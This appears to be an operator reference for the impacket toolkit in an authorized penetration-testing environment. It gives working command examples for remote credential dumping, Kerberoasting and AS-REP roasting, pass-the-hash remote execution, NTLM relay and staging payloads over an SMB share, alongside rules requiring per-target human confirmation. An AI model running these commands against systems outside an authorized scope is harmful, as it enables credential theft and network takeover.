# impacket

Python implementations of the Windows network protocols — SMB, MSRPC, LDAP,
Kerberos, WMI, MSSQL, DCOM — exposed as a large set of standalone scripts.
impacket is the tool for protocol-level Windows work: dumping credential
material (`secretsdump.py`), Kerberos roasting (`GetNPUsers.py`,
`GetUserSPNs.py`), remote execution (`psexec.py`, `wmiexec.py`, `smbexec.py`,
`atexec.py`), share access (`smbclient.py`), SID and registry enumeration
(`lookupsid.py`, `reg.py`, `samrdump.py`) and hosting files for a target to
fetch (`smbserver.py`). `ntlmrelayx.py` is the relay attack framework.

Every script is a separate command in `/opt/venvs/impacket/bin`. They authenticate to
real services, so the same authorization rule as hydra and netexec applies:
explicit human confirmation per target, before the first packet.

## Installation and location

| Item | Value |
|---|---|
| Version | **0.13.1** (the current PyPI release; check with `/opt/venvs/impacket/bin/python3 -c "from importlib.metadata import version; print(version('impacket'))"`) |
| Provenance | Installed from the PyPI release into its own venv, unpinned — see *Limits* for why |
| Location | `/opt/venvs/impacket/bin/*.py` (virtualenv `/opt/venvs/impacket`, on `PATH`) |
| Library | `/opt/venvs/impacket/lib/python3.11/site-packages/impacket` |
| Banner | every script prints an `Impacket v<x.y.z>` banner line with the Fortra copyright |
| Output | stdout only, by default. `secretsdump.py`, `GetNPUsers.py`, `GetUserSPNs.py`, `smbclient.py`, `smbserver.py` accept `-outputfile`; nothing else writes files |

Scripts verified present (not exhaustive): `secretsdump.py`, `GetNPUsers.py`,
`GetUserSPNs.py`, `smbclient.py`, `smbserver.py`, `psexec.py`, `smbexec.py`,
`wmiexec.py`, `dcomexec.py`, `atexec.py`, `lookupsid.py`, `samrdump.py`,
`reg.py`, `rpcdump.py`, `rpcmap.py`, `services.py`, `netview.py`, `ntlmrelayx.py`,
`getTGT.py`, `getST.py`, `ticketer.py`, `ticketConverter.py`, `describeTicket.py`,
`keylistattack.py`, `addcomputer.py`, `changepasswd.py`, `dacledit.py`,
`owneredit.py`, `rbcd.py`, `dpapi.py`, `dpapidump.py`, `mssqlclient.py`,
`mssqlinstance.py`, `exchanger.py`, `findDelegation.py`, `goldenPac.py`,
`raiseChild.py`, `karmaSMB.py`, `smbclient.py`, `sniffer.py`, `wmiquery.py`,
`wmipersist.py`, `GetADUsers.py`, `GetADComputers.py`, `Get-GPPPassword.py`,
`GetLAPSPassword.py`.

## Rules that apply to this tool

1. **Explicit human confirmation per target.** impacket scripts authenticate to
   real services and several of them modify the target (`psexec.py` creates and
   starts a service, `atexec.py` creates a scheduled task, `smbserver.py` opens
   a listener, `ntlmrelayx.py` relays credentials). Confirm the host, the
   credential, the script and the intended effect before running.
2. **Never relay without an explicit, written decision.** `ntlmrelayx.py`
   captures and reuses authentication from whoever connects to it. Running it
   in a shared or production network can authenticate as, and take over,
   accounts that were never in scope. It is a separate authorization from any
   scanning.
3. **All traffic exits the WireGuard tunnel** in the shared netns. A local
   `smbserver.py` listener is reachable on the tunnel address as well as
   loopback — bind it deliberately (`-ip`) and take it down when the transfer
   is done.
4. **Lockout-aware.** `GetNPUsers.py`/`GetUserSPNs.py` with an account list
   make real Kerberos authentication attempts; `-usersfile` against hundreds
   of accounts is a spray. Keep the list to confirmed accounts and expect
   failed logons in the target's event log.
5. **Credential material stays in `$WORK`.** Dumps, tickets and cracked
   material go under `$WORK/loot/impacket/`, with the command line recorded
   next to them.
6. **Kerberos runs need a working clock and DNS.** Container clock skew breaks
   Kerberos (`KRB_AP_ERR_SKEW`); use `-dc-ip`/`-target-ip` rather than relying
   on name resolution.

## Command reference

### Authentication flags (availability varies by script — verified below)

| Flag | Meaning |
|---|---|
| `domain/user:password@target` | The positional target carries the credentials |
| `-hashes LMHASH:NTHASH` | Pass-the-hash. Use `-hashes :NTHASH` when only the NT half is known |
| `-no-pass` | Do not prompt; use with `-k` or `-hashes` |
| `-k` | Kerberos, taking the ccache from `KRB5CCNAME` |
| `-aesKey HEX` | Kerberos AES key (128/256-bit) instead of a password |
| `-dc-ip IP` | Domain controller address — required when the target name does not resolve |
| `-target-ip IP` | Connect to this address while keeping the target's name for SPN purposes |
| `-port N` | Non-default port |
| `-debug`, `-ts` | Debug output, timestamps on log lines |

| Script | `-hashes` | `-k` | `-dc-ip` | `-target-ip` | `-no-pass` |
|---|---|---|---|---|---|
| `secretsdump.py` | yes | yes | yes | yes | yes |
| `GetNPUsers.py` | yes | yes | yes | — | yes |
| `GetUserSPNs.py` | yes | yes | yes | — | yes |
| `smbclient.py` | yes | yes | yes | yes | yes |
| `psexec.py` | yes | yes | yes | yes | yes |
| `wmiexec.py` | yes | yes | yes | yes | yes (no `-port`) |
| `lookupsid.py` | yes | yes | **no** | yes | yes |
| `reg.py` | yes | yes | yes | yes | yes |
| `smbserver.py` | yes | — | yes | — | — |
| `ntlmrelayx.py` | **no** (`-hashes-smb`, `-machine-hashes`) | yes | — | **no** (`-ip` instead) | — |

### The scripts that matter most

| Script | Purpose |
|---|---|
| `secretsdump.py` | Remote SAM/LSA/NTDS dump; local hive/NTDS parsing. Modes: default (SAM+LSA over remote registry), `-just-dc` (DRSUAPI NTDS), `-just-dc-ntlm`, `-just-dc-user USER`, `-use-vss`, or `-sam/-system/-security/-ntds` for local files |
| `GetUserSPNs.py` | Kerberoasting: enumerate SPNs and (with `-request`) emit `$krb5tgs$23$…` |
| `GetNPUsers.py` | AS-REP roasting for accounts without Kerberos pre-auth; `-request`, `-format {hashcat,john}` |
| `smbclient.py` | Interactive SMB minishell (see below) |
| `smbserver.py` | Host a share; used to stage tools/payloads for a target |
| `psexec.py` / `smbexec.py` / `atexec.py` / `wmiexec.py` / `dcomexec.py` | Remote command execution over different transports |
| `lookupsid.py` | SID brute force via LSA — user/host enumeration |
| `reg.py` | Remote registry read/write; `query`, `save`, `add`, `delete` |
| `samrdump.py` | SAMR user enumeration |
| `ntlmrelayx.py` | NTLM relay framework (see below) |

### `smbclient.py`

It is a minishell, not a one-shot tool: `smbclient.py [flags] [domain/]user[:pass]@target`.
Useful interactive commands (verified `help` output): `shares`, `use SHARE`,
`cd`, `lcd`, `ls`, `lls`, `tree`, `pwd`, `get FILE`, `mget MASK`, `rget MASK`,
`put FILE`, `cat FILE`, `rm`, `mkdir`, `rmdir`, `mount`, `list_snapshots`,
`who`, `info`, `acl`, `dfs_info`, `dfs_mode`, `close`, `logoff`, `exit`.
`get`/`put` take a **single** argument (remote filename / local filename) and
transfer to the current local/remote directory — `get file /tmp/out` fails,
because the whole string is taken as the remote filename. For scripted use, feed
commands on stdin or via `-inputfile FILE`, and start the invocation with the
credentials.

### `ntlmrelayx.py`

Requirements verified by starting it in the throwaway container: it binds SMB
445, WinRM 5985/5986, RPC 135, MSSQL 1433 and RDP 3389 (`--no-http-server`,
`--no-wcf-server`, `--no-raw-server` suppress the HTTP/WCF/raw listeners).
Targets must be given with `-t`/`-tf`, and the practical precondition is that
SMB signing is disabled on the target (`nxc smb --gen-relay-list` produces the
list). It relays whatever authentication reaches it — no credentials are
configured by the operator. `-smb2support` is required for modern targets,
`-socks` turns it into a proxy for the relayed session, `-of FILE` writes
relayed hashes to a file.

## Typical workflows

### 1. Confirm reachability and enumerate with one credential

```bash
smbclient.py 'CORP/alice:Passw0rd!@10.0.0.20' <<'CMDS'
shares
use SYSVOL
ls
exit
CMDS
lookupsid.py 'CORP/alice:Passw0rd!@10.0.0.20'
```

### 2. Dump credentials

```bash
mkdir -p "$WORK/loot/impacket"
# remote SAM + LSA (admin required on the target)
secretsdump.py 'CORP/alice:Passw0rd!@10.0.0.20' -outputfile "$WORK/loot/impacket/sam-10.0.0.20"
# domain-wide NTDS via DRSUAPI (domain admin required)
secretsdump.py -just-dc 'CORP/Administrator:Passw0rd!@10.0.0.10' \
  -outputfile "$WORK/loot/impacket/ntds"
# parse hives already copied locally, no network at all
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

Output lines are `user:rid:lmhash:nthash:::` — feed them to
`hashcat -m 1000 --username` unchanged.

### 3. Kerberoasting and AS-REP roasting

```bash
GetUserSPNs.py -dc-ip 10.0.0.10 -request 'CORP/alice:Passw0rd!' \
  -outputfile "$WORK/loot/kerberoast.txt"
GetNPUsers.py -dc-ip 10.0.0.10 -request -format hashcat \
  -usersfile "$WORK/users.txt" 'CORP/' -outputfile "$WORK/loot/asrep.txt"
hashcat -a 0 -m 13100 "$WORK/loot/kerberoast.txt" words.txt \
  -r /usr/share/hashcat/rules/best64.rule </dev/null
hashcat -a 0 -m 18200 "$WORK/loot/asrep.txt" words.txt </dev/null
```

### 4. Execute a command remotely

```bash
psexec.py 'CORP/alice:Passw0rd!@10.0.0.20' -debug
wmiexec.py -hashes :d75431eb358edcabbf20e45787c3fb5f 'CORP/alice@10.0.0.20' 'whoami /all'
atexec.py 'CORP/alice:Passw0rd!@10.0.0.20' 'cmd /c hostname'
```

`psexec.py`/`smbexec.py`/`atexec.py` write to the target (service, task, files
in `ADMIN$`); `wmiexec.py`/`dcomexec.py` are fileless but depend on DCOM/RPC.

### 5. Stage a file with `smbserver.py`, and the relay path

```bash
mkdir -p "$WORK/loot/shares/pub"
smbserver.py -smb2support -username stage -password 'Staging!23' \
  -outputfile "$WORK/loot/shares/access.log" PUB "$WORK/loot/shares/pub"
# target-side fetch (authorized host): copy \\<tunnel-ip>\PUB\tool.exe C:\Windows\Temp\
```

Verify locally before relying on it:

```bash
smbclient.py stage:'Staging!23'@127.0.0.1 <<'CMDS'
shares
use PUB
ls
exit
CMDS
```

Relay targets come from the same discovery step, and only with explicit
authorization:

```bash
nxc smb 10.0.0.0/24 --gen-relay-list "$WORK/relay-targets.txt"
ntlmrelayx.py -tf "$WORK/relay-targets.txt" -smb2support -of "$WORK/loot/relayed.txt"
```

## Output and parsing

All scripts write human-readable text to stdout; there is no JSON mode. The
formats that matter downstream (shapes shown are documented behaviour — the
loopback-verified outputs are in [`EXAMPLES.md`](EXAMPLES.md)):

`secretsdump.py` (SAM/LSA/NTDS lines):

```
[*] Target system bootKey: 0x…
CORP\alice:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[*] Kerberos keys grabbed
CORP\alice:aes256-cts-hmac-sha1-96:…
```

`-outputfile PREFIX` writes one file per section alongside the stdout copy
(suffixes read from `impacket/examples/secretsdump.py`): `PREFIX.sam` for the
SAM hashes, `PREFIX.secrets` for LSA secrets, and `PREFIX.ntds` (plus
`PREFIX.ntds.kerberos`, `PREFIX.ntds.cleartext`) for NTDS. Filter stdout with
`grep -E '^[^[]'` or `awk -F: 'NF>=4'`.

`GetUserSPNs.py -request`:

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$b548e10f…$35e8e456…
```

`GetNPUsers.py -request -format hashcat`:

```
$krb5asrep$23$alice@CORP.LOCAL:0e0e5f…$…
```

Both go straight to hashcat (`-m 13100` / `-m 18200`) with no conversion;
`-format john` produces the `$krb5tgs$23$*…` variant john expects — but this
image's core john has no Kerberos format, so use the hashcat output.

`smbclient.py -outputfile FILE` logs every command and response. `smbserver.py
-outputfile FILE` logs SMB operations, e.g.
`09/17/2026 08:45:44 PM: INFO: NetrShareEnum Level: 1`.

Error lines are prefixed `[-]` with the NTSTATUS where one exists, e.g.
`[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE …` or
`[-] RemoteOperations failed: SMB SessionError: code: 0xc000000f -
STATUS_NO_SUCH_FILE …`.

## Chaining with the rest of the toolchain

- **nmap → impacket.** `nmap -p445,135,5985,88,389` gives the protocol surface:
  445 SMB (`smbclient.py`, `secretsdump.py`), 135 RPC (`rpcdump.py`,
  `samrdump.py`), 5985 WinRM (`nxc winrm`), 88 Kerberos (`GetNPUsers.py`,
  `GetUserSPNs.py` with `-dc-ip`).
- **netexec → impacket.** `nxc` for breadth (spray, `--shares`, `--sam`),
  impacket for depth (a specific dump mode, a specific RPC call, an
  `-outputfile` artifact). Both are working SMB paths in this image.
- **impacket → hashcat.** `secretsdump.py` and the Kerberos scripts emit
  hashcat-ready text; keep the files untouched and use `--username` for dump
  files.
- **hashcat → impacket.** A cracked password goes back in as
  `domain/user:password@target` for re-validation, or as `-aesKey` if the dump
  included Kerberos keys.
- **`smbserver.py` ↔ payload staging.** Host a tool the target will fetch;
  record the `-outputfile` access log as evidence.
- **Evidence into the findings note.** The `-outputfile` artifacts, the exact
  command line and the account used; never paste hash dumps into a note that
  is shared more widely than the engagement.

## Limits, failure modes and gotchas

**impacket is unpinned, and it cannot usefully be pinned while NetExec is
installed elsewhere.** NetExec declares `impacket @ git+https://github.com/fortra/impacket`
— an unreleased revision — and a single pip resolution cannot satisfy both that
and a release pin. That is exactly why the two tools now have separate venvs:
impacket tracks the current PyPI release in `/opt/venvs/impacket`, NetExec
resolves its own git revision in `/opt/venvs/netexec`, and neither constrains
the other. If a flag in this document is missing, check `<script>.py -h` — the
release tracks upstream, so the installed version may be newer than described.

**`hashlib.new('md4')` does not work in this image** (OpenSSL 3 legacy provider
is not enabled): `ValueError: [unsupported hash type md4]`. Compute NT hashes
with impacket itself — bare `python3` is `/opt/py/bin/python3`, which cannot
import impacket, so use the venv interpreter:

```bash
/opt/venvs/impacket/bin/python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Password1').hex())"
```

**`-hashes` needs the right half.** `-hashes :NTHASH` (empty LM) is the usual
form; passing `:0000…` or omitting the NT hash produces
`STATUS_LOGON_FAILURE`. Verified working against a local `smbserver.py` with
`-hashes :d75431eb358edcabbf20e45787c3fb5f` (the NT hash of the server's
password).

**`smbserver.py` and port 445.** It must bind 445 (root is fine in this
container), and something else already on 445 makes `ntlmrelayx.py` traceback
in `start_servers`. Check with `ss -ltnp` and stop your own listener when done.

**Remote execution scripts need a real Windows target.** Against anything that
is not Windows they fail *after* authentication, with
`STATUS_NO_SUCH_FILE - {File Not Found}` (missing `\pipe\svcctl`, `\pipe\winreg`,
etc.) or, for `wmiexec.py`, `SMBv3.0 dialect used` followed by
`[-] Could not connect: [Errno 111] Connection refused` on the DCOM port.
Verified against an impacket `smbserver.py` — these errors mean "not a Windows
host", not "wrong password".

**`lookupsid.py` has no `-dc-ip`.** Use `-target-ip` for the address and put
the domain in the positional credentials; same for `GetNPUsers.py`/
`GetUserSPNs.py`, which do have `-dc-ip` but no `-target-ip`.

**Kerberos needs a ccache, not just `-k`.** `-k` reads `KRB5CCNAME`; obtain a
ticket first with `getTGT.py` and export the variable, or pass `-aesKey`/
`-hashes`. Without a ticket, `-k` prompts or fails.

**Clock skew and DNS.** Kerberos tickets are time-sensitive; a container clock
off by more than a few minutes yields `KRB_AP_ERR_SKEW`. Use IPs for transport
(`-dc-ip`, `-target-ip`) and keep the FQDN in the credential string for SPNs.

**Roasting scripts talk to different ports.** `GetNPUsers.py` fails against a
non-DC with `[Errno Connection error (127.0.0.1:88)] [Errno 111] Connection
refused` after printing `[*] Getting TGT for <user>`; `GetUserSPNs.py` reports
`[-] [Errno 111] Connection refused` when it cannot reach LDAP/KDC. Both need a
reachable DC — no DC, no output.

**`ntlmrelayx.py` is not stealthy and not reversible.** It answers
authentication from anything that connects; a single mis-scoped run can capture
domain credentials. It also holds ports 445/135/1433/3389/5985 on the
container's interface — do not leave it running.

**No JSON output anywhere.** impacket is text-only; parse with `awk`/`grep` and
keep the raw output as the artifact.

## Safety and scope

Never run without explicit human confirmation per target:

- `ntlmrelayx.py` in any form (state the interface, the targets and the
  duration);
- `secretsdump.py` against a domain controller or any host not confirmed for
  credential dumping (`-just-dc` is a domain-wide credential compromise);
- `psexec.py`, `smbexec.py`, `atexec.py`, `wmiexec.py` — these execute commands
  and leave artifacts (services, tasks, files) on the target;
- `reg.py add/delete`, `addcomputer.py`, `changepasswd.py`, `dacledit.py`,
  `owneredit.py`, `rbcd.py`, `ticketer.py`, `goldenPac.py`, `raiseChild.py` —
  every one of these modifies the target or forges credentials;
- `GetNPUsers.py`/`GetUserSPNs.py` with a large `-usersfile` (that is a spray,
  with lockout consequences);
- starting `smbserver.py` on anything other than loopback without saying so —
  it is an open listener on the tunnel address;
- copying credential dumps out of `$WORK` or into a findings note.
